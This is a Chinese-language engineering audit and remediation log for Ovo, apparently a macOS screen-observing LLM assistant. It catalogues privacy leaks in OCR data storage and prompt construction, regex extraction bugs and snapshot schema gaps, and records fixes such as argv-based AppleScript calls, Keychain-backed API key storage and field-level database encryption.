Ovo 的产品立意（主动观察 + 多人格 + 自我进化）非常有 ambition，关键模块（scheduler、prompt 自评、KG GC、sensitive-filter、preload allowlist）显示团队懂工程。但当前阶段三个维度都还在「能跑」的状态：

- **产品**：偏中后台 Web 审美，离原生 macOS 一线 app 差最关键的一层精修；中英文 jargon 混杂，文案缺统一语气
- **代码**：两个 1800+ 行的上帝文件 + 主进程同步阻塞 + 类型双向化破窗，技术债快速累积
- **安全**：把任意 AppleScript / 系统命令的执行权赋予了 LLM 输出，prompt injection 风险窗口大开

**如果只挑 5 件事先做**：

1. **SEC-1 + SEC-2 + SEC-3**：LLM → 系统命令路径全部改成参数化白名单模板
2. **SEC-4**：API key 改 `safeStorage` 加密
3. **CODE-4**：`agent-bridge` fetch 加 `AbortSignal.timeout`
4. **UX-3**：把微信绿换成 systemBlue/systemTeal
5. **UX-6 + UX-2**：FloatingIcon 窗口尺寸 + Console backgroundColor 适配主题

这 5 件加起来不到一天工作量，但能把"产品观感 + 安全风险"两端的最大破窗都堵上。

---

## 四、OCR 数据落地审计（2026-05-16 增补）

### 4.1 OCR 之后的 7 个数据落地点

| # | 位置 | 内容 | 持久化 | 加密 |
|---|---|---|---|---|
| ④ | `AutoCaptureService.history[]` | 100 条 snapshot 含 text | 内存 | ❌ |
| ⑤ | `EventProcessor.buffers` | window→entries（多帧 OCR） | 内存 | ❌ |
| ⑥ | `SessionTracker.steps[]` | 5min 轨迹 snippet | 内存 | ❌ |
| ⑨ | **`memory_events.content`** | **完整 mergedText** | ✅ 永久 | ❌ |
| ⑩ | **`pipeline_logs.stages.aggregate.output.preview`** | mergedText 前 2000 字 | ✅ 永久 | ❌ |
| ⑪ | **`business_logs.input/output`** | 各 stage 的 prompt + LLM 原始返回 | ✅ 永久 | ❌ |
| ⑫ | `entities` + `relationships` | LLM 抽出概念 + 关系（含 aliases/context/evidence） | ✅ 永久 | ❌ |

### 4.2 数据落地问题（DATA-1 ~ DATA-13）

#### 🔴 P0

- **DATA-1** `memory_events.content` 写完整 mergedText 永久存（`ipc-handlers.ts:1033`）。SQLite 未加密，本地任何进程 / TimeMachine / iCloud Drive 可读。跑一个月 = 30 天屏幕内容明文。
- **DATA-2** `pipeline_logs.stages` 的 `aggregate.output.preview` 再存 2000 字 preview（`ipc-handlers.ts:672`）。**与 DATA-1 重复存了一份**。
- **DATA-3** `business_logs.input/output` JSON 含 prompt 全文 + LLM raw response。每 pipeline 5+ stage 各存一份，相当于完整对话日志永久留底。
- **DATA-4** sensitive-filter 漏过的敏感词进 KG 后**无清除机制**。用户事后想"删掉所有含 sk-xxx 的记录"做不到。

#### 🟡 P1

- **DATA-5** `entities.aliases` 可能存敏感字面量（LLM 把"user@host.com"当 entity 抽出）。
- **DATA-6** `relationships.evidence/context` 可能含 LLM 引用原文。
- **DATA-7** `addEvent` 不限长——mergedText 几万字直接进 content。
- **DATA-8** `clearAll` 不删 `prompt_eval_suggestions` / `user_feedback`（review CODE-15 已提）。
- **DATA-9** 进程崩溃 .crashreport 可能含内存 dump（buffers/sessionTracker 明文）。
- **DATA-10** 没有数据 retention——所有表永久增长。

#### 🟢 P2

- **DATA-11** OCR confidence 不做下游过滤，乱码也入 KG。
- **DATA-12** 脱敏命中数只记 errorLogger.alert，用户在 UI 上看不到。
- **DATA-13** `entities.attributes` JSON 由 LLM 输出决定，可能塞原文片段。

---

## 五、extractStructured 与 CaptureSnapshot 审计（2026-05-16）

### 5.1 extractStructured 数据走向

```
ocr.text (脱敏后)
    │
    ▼
extractStructured(text)
    │ ├─ matchAll URL_RE / EMAIL_RE / PRICE_RE / FILE_PATH_RE / DATE_RE / IP_RE / HASHTAG_RE
    │ ├─ detectHeadings (启发式)
    │ ├─ detectCodeSnippets (启发式)
    │ └─ uniqueTrim 各 ≤10
    │
    ▼ StructuredSignals
    │
auto-capture.ts:338  structured = extractStructured(snapshot.text)
    │
    ▼ 仅进 OCRTextEntry.structured（不进 CaptureSnapshot / history / sessionTracker / KG）
eventProcessor.append(... { ts, text, confidence, structured })
    │
    ▼ buffer.entries[]
    │
pipeline.drain → adaptive-prompt.ts:245-256
    │ 各 entry.structured 合并去重
    │
    ▼ formatStructuredForPrompt → prompt section "## 屏幕中已识别的关键信号"
    │
    ▼ 外发给 LLM（Claude API / Hermes / OpenClaw）
```

### 5.2 extractStructured 问题（EXT-1 ~ EXT-9）

#### 🔴 P0 隐私

- **EXT-1** **URL / 邮箱 / 文件路径不脱敏直接送 LLM**。`sensitive-filter` 仅擦 "password/reset/2fa" 上下文邮箱；普通邮箱被 `EMAIL_RE` 抽出后通过 `formatStructuredForPrompt` 拼进 prompt 外发。URL 完全没擦——`https://medical.example.com/patient/123` 这种敏感网址直接喂云端 LLM。`/Users/dushaobin/secrets/` 包含用户名 PII + 项目商业信息也送出。
- **EXT-2** **codeSnippets 不脱敏**。代码片段里可能有 API key、内部主机名、商业秘密。`extractStructured` 抽完后直接拼进 prompt 给 LLM 看。

#### 🟡 P1 精度

- **EXT-3** `URL_RE` `[^\s)<>'"\`]+` 吞 trailing 标点：`https://example.com.` 末尾 `.` 被吃；不抓 `ftp://` `ssh://` `mailto:`。
- **EXT-4** `EMAIL_RE` 太简单：漏 `user+tag@host`、quoted local part。
- **EXT-5** `PRICE_RE` 漏 KRW/INR/MYR/IDR/THB/TWD；漏 "$1k" / "￥1万" / "¥1.5w"。
- **EXT-6** `FILE_PATH_RE` 必须有扩展名才抓——漏目录路径；仅匹 `/Users/`，漏 `/opt/` `/etc/` `/Applications/` `/var/` `/tmp/`。
- **EXT-7** `DATE_RE` 漏 ISO 时间戳 `2026-05-16T14:30:00Z`、漏中文相对日期 "今天/明天/下周三"。
- **EXT-8** `IP_RE` 误判：版本号 `1.2.3.4`、坐标 `1.0.0.0` 都会被当 IP 抽出。
- **EXT-9** `HASHTAG_RE` 范围窄：只抓中英文 `#`，漏日韩。

#### 🟢 P2 设计

- **EXT-10** `detectHeadings` 50% letter ratio 启发式：注释 `// ALL CAPS` 会被当 heading。
- **EXT-11** `detectCodeSnippets` 240 字硬截断，可能截在标识符中间。
- **EXT-12** structured 字段**用完即弃**——不进 CaptureSnapshot / history / sessionTracker / KG。用户事后想"过去 1 小时我看过哪些 URL"做不到（要重抽 OCR 原文）。
- **EXT-13** 抽取无 confidence 加权：OCR confidence < 60% 的乱码仍跑 regex，得到的"URL" / "邮箱"可能是乱码。

### 5.3 CaptureSnapshot 数据走向

```
{ timestamp, appName, windowId, windowTitle, text, confidence, captureSource? }
    │
    ├──▶ history.unshift  (内存 100 条)
    ├──▶ listener(snapshot) → 悬浮球 + pipeline 调度
    └──▶ sessionTracker.append  (重新构造 payload，没复用 snapshot)
```

### 5.4 CaptureSnapshot 问题（SNAP-1 ~ SNAP-10）

#### 🔴 P0

- **SNAP-1** **`windowTitle` 未脱敏**。`redactSensitive` 只走 `ocr.text`。邮件主题 / 客户名 / 订单号 / 验证码弹窗 / "Reset password for user@x" 都进 history、喂 LLM、写 `memory_events.window_title`、永久留底。**与 SEC-9 / DATA-1 复合 = 重伤**。

#### 🟡 P1

- **SNAP-2** 缺 `engine: "vision" | "tesseract"` 字段——回放时无法知道这条是 Vision 还是 Tesseract fallback 出的。
- **SNAP-3** 缺 `durationMs` 字段——OCR 性能数据丢失，无法监控引擎退化。
- **SNAP-4** 缺 `structured` 字段——结构化信号只进 buffer，history snapshot 看不到。
- **SNAP-5** `timestamp` 用 `Date.now()` 非 monotonic——用户改系统时间会导致 history 排序错乱、`sessionTracker.evictOld` 失效。
- **SNAP-6** `text` 不限长——长 PDF / 文档 OCR 可能几万字进 snapshot，100 条 history × 几 MB = 严重内存压力。

#### 🟢 P2

- **SNAP-7** `captureSource` 是 optional 但所有写入点都传值——应改 required。
- **SNAP-8** 缺 `frameHash` / pHash 字段——`FrameChangeDetector` 算的 hash 没存进 snapshot，跨进程重启后无法判断"两帧是否相同"。
- **SNAP-9** 不带 schema 版本号——字段加减后未来若持久化老 history 会读不动。
- **SNAP-10** `windowId` 是内部 ID 但写进 `memory_events.source_window_id`。理论上不敏感但是内部 schema 泄露面。

---

## 六、修复优先级（截至 2026-05-16）

| 排序 | 项 | 工作量 | 影响 |
|---|---|---|---|
| 🥇 | **SNAP-1**: `windowTitle` 强制走 redactSensitive | 5 分钟 | 立刻堵 P0 隐私敞口 |
| 🥈 | **DATA-1 + DATA-7**: `memory_events.content` 强制截断 + 二次脱敏 | 15 分钟 | 堵 KG 主要落地点 |
| 🥉 | **EXT-1 + EXT-2**: URL/邮箱/路径/代码片段在拼 prompt 前再过一遍脱敏 | 30 分钟 | 切断结构化外发链路 |
| 4 | **DATA-2 + DATA-3**: pipeline_logs / business_logs 不再存原文 preview | 30 分钟 | 消除冗余存储 |
| 5 | **DATA-10**: 30 天 retention 自动 GC | 1 小时 | 限制数据膨胀 |
| 6 | **SQLite 加密**（SQLCipher） | 半天 | 终极方案 |

---

## 七、用户产品需求（2026-05-16 增补）

用户明确提出 4 项产品/架构要求，需要与已知问题一起修复：

### NEW-1 [P0] 必须保留 OCR 历史记录
- 不能因为隐私问题就不保留——历史是 ovo 的核心价值（"做过的事"、可审计、可学习）
- 但必须满足：脱敏后存 + 限长 + 长期 retention + （未来）加密
- **与 DATA-1/7/10 复合解决**

### NEW-2 [P0] 喂 LLM 必须按窗口分发，绝不能混合
- 当前 `runPipelineForWindow(buffer)` 已是窗口级（`ipc-handlers.ts:625-642` for-loop per buffer），但**没有静态约束**保证未来重构不退化
- 退路：至少按 appName 分；绝不允许把多个 app 的 OCR 拼成一段送 LLM
- 修复：① 加显式 invariant 注释 + assertion；② 后续考虑加 lint 规则禁止合并 buffer

### NEW-3 [P0] 同窗口连续帧只发 diff（节省 LLM token）
- 当前 `aggregate` 阶段把 buffer.entries 全 join 成 mergedText（`ipc-handlers.ts:667`），即便 5 帧 OCR 文本 95% 相同也会送 5 份
- 应改成：第一帧全量 + 后续帧只发 diff（行级 diff 或字符级 diff）
- 节省 token + 也让 LLM 关注 "什么变了" 而不是 "看到了什么"

### NEW-4 [P0] 持久化双轨：原始 + LLM 总结，UI 优先显示总结
- 当前 `memory_events` 有 content（原始 OCR） + summary（LLM 摘要），但 UI 上 ProcessPanel 显示 `c.ocrPreview` 原始内容，给用户看到一堆乱码 + 无用 UI 文字
- 应改成：
  - 持久化层：保留 content（原文，供审计）+ summary（人类可读总结）
  - 展示层：默认显示 summary；"查看原文"按钮才展开 content
  - OCR confidence < 阈值的乱码不入 KG（与 DATA-11 合并修）


---

## 八、Sprint 2 SEC-3/4/8 修复记录（2026-05-16）

### SEC-3: AppleScript 注入路径完全堵死 ✅
- `macos-actions.ts` 四个函数全部改用 `osascript on run argv` 机制
- 用户/LLM 提供的字符串作为命令行参数传入，AppleScript 把它们当字面量字符串读取
- `\n` `"` 等控制字符无法逃逸出 string literal，注入面归零

### SEC-4: API key 走 safeStorage ✅
- 新建 `electron/secrets-store.ts`，封装 `safeStorage.encryptString` (macOS Keychain)
- API key 落盘到 `userData/secrets.json` 加密形态
- `agentBridge` 不再持有明文 key——调用时从 secrets-store 读，用完即弃
- renderer 通过 IPC 只能 set / clear / 查询 mask 状态，**永远拿不到明文**
- baseUrl 白名单（仅 5 家可信厂商）防 XSS 重定向窃 key
- 老用户 zustand persist v3→v4 迁移：`apiKey` 字段从 localStorage 抹除
- UI 改成「已配置 + sk-***abc / 修改 / 清除」三态

### SEC-8: 字段级加密（务实方案，非全库加密）⚠️
- **尝试**：`better-sqlite3-multiple-ciphers` 全库 SQLCipher 加密。该包用旧 V8 API（非 N-API），与 Node 25 ABI 不兼容，编译失败。
- **务实方案**：
  - `memory_events.content / summary` 高敏感字段走 `safeStorage.encryptString` **字段级加密**（密钥在 macOS Keychain）
  - 落盘格式 `enc:v1:<base64>`，老数据自动向前兼容（明文不动）
  - 读取时 `decryptEventRow` 统一过解密层
  - userData 目录 chmod 700、data 子目录 chmod 700、ovo.sqlite 文件 chmod 600
- **保护效果**：
  - 攻击者拿到 ovo.sqlite 文件 → 看到 `enc:v1:...` 密文，没 Keychain 解不开
  - 同机其他用户 → 文件权限阻挡
  - 同用户其他进程（malware） → safeStorage 调用同样需要 Keychain 解锁（与登录态绑定）
- **遗留风险（明确告知）**：
  - `entities` / `relationships` / `entities.aliases` 仍明文——LLM 抽出的概念名 / 关系描述
  - `pipeline_logs.stages` / `business_logs.input/output` 已限到 200-500 字 preview，但仍明文
  - 真正的"全库 SQLCipher 加密"需要：① 找一个 N-API 兼容的 SQLCipher 绑定包 / ② 切换到 `@journeyapps/sqlcipher`（用 node-sqlite3 不是 better-sqlite3，重写大量代码） / ③ 用 `@electron/rebuild` 让 multi-ciphers 用 Electron Node v20 头编译——后续 sprint 解决

### 验证
- `pnpm typecheck` ✓
- `pnpm lint` ✓
- `pnpm build` (renderer + electron) ✓
- `pnpm test:agents` ✓（2 PASS, 2 SKIP）
